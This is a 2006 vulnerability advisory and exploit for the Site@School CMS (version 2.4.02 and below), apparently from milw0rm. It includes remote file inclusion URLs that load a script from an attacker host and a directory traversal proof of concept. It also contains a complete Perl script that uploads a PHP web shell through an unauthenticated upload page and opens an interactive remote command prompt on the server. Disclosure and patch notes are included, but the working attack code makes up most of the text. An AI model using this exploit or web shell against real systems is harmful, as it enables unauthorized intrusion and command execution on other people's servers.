# Title: Site@School 2.4.02 and below Multiple remote Command Execution Vulnerabilities
# Vendor: Site@School
# webiste : http://siteatschool.sourceforge.net/ 
# Version : <= 2.4.02
# Severity: Critical 
# Discovered by: Simo64 <simo64_at_morx_org> 
# Exploit writting by: Simo Ben youssef <simo_at_morx_org>  
# Discovered: 05 Aout 2006
# Published : 15 September 2006
# MorX Security Research Team
# http://www.morx.org 
# Original File: http://www.morx.org/school.txt

# Details

# Remote File Inclsuion :

# vulnerable code in starnet/modules/sn_allbum/slideshow.php near line 39 - 46:

# [code]
# ------------------------------------------------------------------
# if(file_exists("$cmsdir/languages/$language/sn_allbum/$language.php")) 
# {
# 	  include("$cmsdir/languages/$language/sn_allbum/$language.php");
# } 
# else 
# {
#	 include("$cmsdir/languages/EN/sn_allbum/EN.php");
# }
# -------------------------------------------------------------------[/code]

# vulnerable code in line 91 :

# [code]
# ----------------------------------------------------------------
#	 include("$cmsdir/themes/$themelocation/".$content_parm[0]); 
# ------------------------------------------------------------------[/code]

# $cmsdir is not properly verified ,can be used to include files from remote
# resources witch would allow a remote attacker to execute arbitary command with the # privilege of the webserver

# Note : multiple files are affected !

# Exploit : 

# http://localhost/starnet/modules/sn_allbum/slideshow.php?cmsdir=http://attacker/evilscript.txt?cmd=ls
# http://localhost/starnet/modules/include/include.php?cmsdir=http://attacker/evilscript.txt?cmd=ls
# http://localhost/starnet/themes/editable/main.inc.php?cmsdir=http://attacker/evilscript.txt?cmd=ls


# =======================
# Directory Traversal   :
# =======================

# PoC :

# http://localhost/starnet/editors/htmlarea/popups/images.php?dir=../../

# =======================
# Arbitary File Upload  :
# =======================

# vulnerable code in starnet/editors/htmlarea/popups/images.php near lines 58 - 104

# [code]
# ----------------------------------------------------------
# $BASE_DIR = $server_path;
# $BASE_ROOT = $user_path.'/'.$media ;

# if(isset($_FILES['upload']) && is_array($_FILES['upload']) && isset($_POST['dirPath'])) 
# {

#	 $dirPathPost = $_POST['dirPath'];
#	 if(strlen($dirPathPost) > 0) 
#	 {
#		 if(substr($dirPathPost,0,1)=='/') 
#			 $IMG_ROOT .= $dirPathPost;		
#		 else
#			 $IMG_ROOT = $dirPathPost;			
#	 }

#	 if(strrpos($IMG_ROOT, '/')!= strlen($IMG_ROOT)-1) 
#		 $IMG_ROOT .= '/';

#	 do_upload($_FILES['upload'], $BASE_DIR.$BASE_ROOT.$dirPathPost.'/');
# }

# /*[morx] do_upload function code [/morx]*/


# function do_upload($file, $dest_dir) 
# {
# 	global $clearUploads, $perm;

# 	if(is_file($file['tmp_name'])) 
#	 {  
#         # Remove spaces, apostrophe, exclamation marks etc.
#         $str_from = " \'@!,/\\\t\*?`\"" ;
#         $str_to = str_repeat("_",strlen($str_from));
#         $file_name = strtr($file['name'],$str_from,$str_to);  
#		 //var_dump($file); echo "DIR:$dest_dir";
#		 move_uploaded_file($file['tmp_name'], $dest_dir.$file_name);
#	 	 //get filepermissions from config and chmod it.
#		 eval("chmod('$dest_dir.$file_name', $perm);");
#	 }

#	 $clearUploads = true;
# }

# ---------------------------------------------------------[/code]

# the first problem is that starnet/editors/htmlarea/popups/images.php is accessible
# directelly to any user without any authentificagtion , 
# the second problem is that the script doesn't verify thefile extension so an attacker needs just to complete the
# condition in line 88 to upload a malicious script

# Disclosure History:

# 05 Aout 2006 : Discovered
# 05 Aout 2006 : Contacted Vendor with vulnerabilities information
# 23 Aout 2006 : Vendor released 2.4.03

# Patch:

# Upgrade to the latest version.

# Exploit :
# =========
# [code]

# C:\>perl school.pl localhost

# --- Site@school remote file upload Xploit
# --- Writting By Simo ben youssef / Simo_at_morx_org
# --- MorX Security Research Team
# --- www.morx.org

# [*] checking if zebi.php was successfully uploaded ...
# [+] zebi.php was successfully uploaded

# ####################################
# ####     ET VOILA, YOU ARE IN  #####
# ####################################

# Linux localhost 2.6.12.6-xenU #1 SMP Sun Dec 4 20:49:44 GMT 2005 x86_64 GNU/Linux

# uid=33(www-data) gid=33(www-data) groups=33(www-data)

# [www-data@localhost:]#exit
# Connection Closed

use IO::Socket;
use LWP::Simple;

if(!defined($ARGV[0])) {

print "\n--- Site\@school remote file upload Xploit\n";
print "--- Writting By Simo ben youssef / Simo_at_morx_org\n";
print "--- MorX Security Research Team\n";
print "--- www.morx.org\n\n";

print "--- Usage:   perl $0 <host>\n";
print "--- Example: perl $0 localhost\n\n";
exit; }

$TARGET = $ARGV[0];
$PORT   = "80";
$SCRIPT = "starnet/editors/htmlarea/popups/images.php";
$SHELL  = "/starnet/media/zebi.php?cmd=";
$HTTP   = "http://";


$COMMAND1 = "POST /$SCRIPT HTTP/1.1";
$COMMAND2 = "Accept: image/gif, image/x-xbitmap, image/jpeg,  image/pjpeg, application/x-shockwave-flash, */*";
$COMMAND3 = "Accept-Language: en-us";
$COMMAND4 = "Content-Type: multipart/form-data; boundary=-------- -------------------7d62e2819048c2";
$COMMAND5 = "Accept-Encoding: gzip, deflate";
$COMMAND6 = "User-Agent: Mozilla/4.0 (compatible; MSIE 6.0;  Windows NT 5.1)";
$COMMAND7 = "Host: $TARGET";
$COMMAND8 = "Content-Length: 438";
$COMMAND9 = "Connection: Keep-Alive";
$COMMAND9a = "Cache-Control: no-cache";
$COMMAND10 = "-----------------------------7d62e2819048c2";
$COMMAND11 = 'Content-Disposition: form-data; name="dirPath"';
$COMMAND12 = "/";
$COMMAND13 = 'Content-Disposition: form-data; name="upload";  filename="C:\zebi.php"';
$COMMAND14 = "Content-Type: application/octet-stream";
$COMMAND15 = "<? system(\$_GET['cmd']\);exit; ?>";
$COMMAND16 = 'Content-Disposition: form-data; name="upload"';
$COMMAND17 = "Upload";
$COMMAND18 = "-----------------------------7d62e2819048c2--";
$COMMAND19 = "HEAD /starnet/media/zebi.php HTTP/1.1";

$remote = IO::Socket::INET->new(Proto=>"tcp",PeerAddr=>"$TARGET" ,PeerPort=>"$PORT")
|| die "Can't connect to $TARGET";

print "\n--- Site\@school remote file upload Xploit\n";
print "--- Writting By Simo ben youssef / Simo_at_morx_org\n";
print "--- MorX Security Research Team\n";
print "--- www.morx.org\n\n";


print "[*] Trying to upload zebi.php ...\n\n";

sleep 2;
print $remote "$COMMAND1\n$COMMAND2\n$COMMAND3\n$COMMAND4\n$COMMAND5\n$COMMAND6\n$COMMAND7\n$COMMAND8\n$COMMAND9\n$COMMAND9a\n\n";

print $remote "$COMMAND10\n$COMMAND11\n\n$COMMAND12\n$COMMAND10\n$COMMAND13\n$COMMAND14\n\n$COMMAND15\n$COMMAND10\n$COMMAND16\n\n$COMMAND17\n$COMMAND18\n\n";

print "[*] checking if zebi.php was successfully uploaded ...\n";

print $remote "$COMMAND19\n$COMMAND7\n$COMMAND9\n$COMMAND9a\n\n";

while ($output = <$remote> ) {
if ($output =~ /200 OK/) {
print "[+] zebi.php was successfully uploaded\n\n";

$cmd2   = "uname -n";
$cmd3   = "whoami";
$cmd4   = "uname -a";
$cmd5   = "id";
$unamea = "$HTTP$TARGET$SHELL$cmd4";
$id     = "$HTTP$TARGET$SHELL$cmd5";
$uname  = "$HTTP$TARGET$SHELL$cmd2";
$whoami = "$HTTP$TARGET$SHELL$cmd3";
$w      = get($whoami);
$u      = get($uname);
chomp($w);
chomp($u);
$ua     = get($unamea);
$i      = get($id);
print "####################################\n";
print "####     ET VOILA, YOU ARE IN  #####\n";
print "####################################\n\n";

print "$ua\n$i";

while () {

print "\n[$w\@$u:]#";

chomp($cmd=<STDIN>);
if ($cmd eq "exit") 
{ 
print "Connection Closed\n";
$remote->flush();
close($remote);
exit;
}

$LEHWA   = "$HTTP$TARGET$SHELL$cmd";

if($cmd eq "")
{ 
print "empty command ! for help, type help\n"; }
else
{ 
getprint($LEHWA)
}
}
$a = 1
}
}

if ($a == 0)
{ print "[-] failed\n";
}
$remote->flush();
close($remote);
exit;

# Disclaimer:

# This entire document is for eductional, testing and demonstrating purpose only.
# Modification use and/or publishing this information is entirely on your OWN risk.
# I cannot be held responsible for any of the above.

# milw0rm.com [2006-09-15]
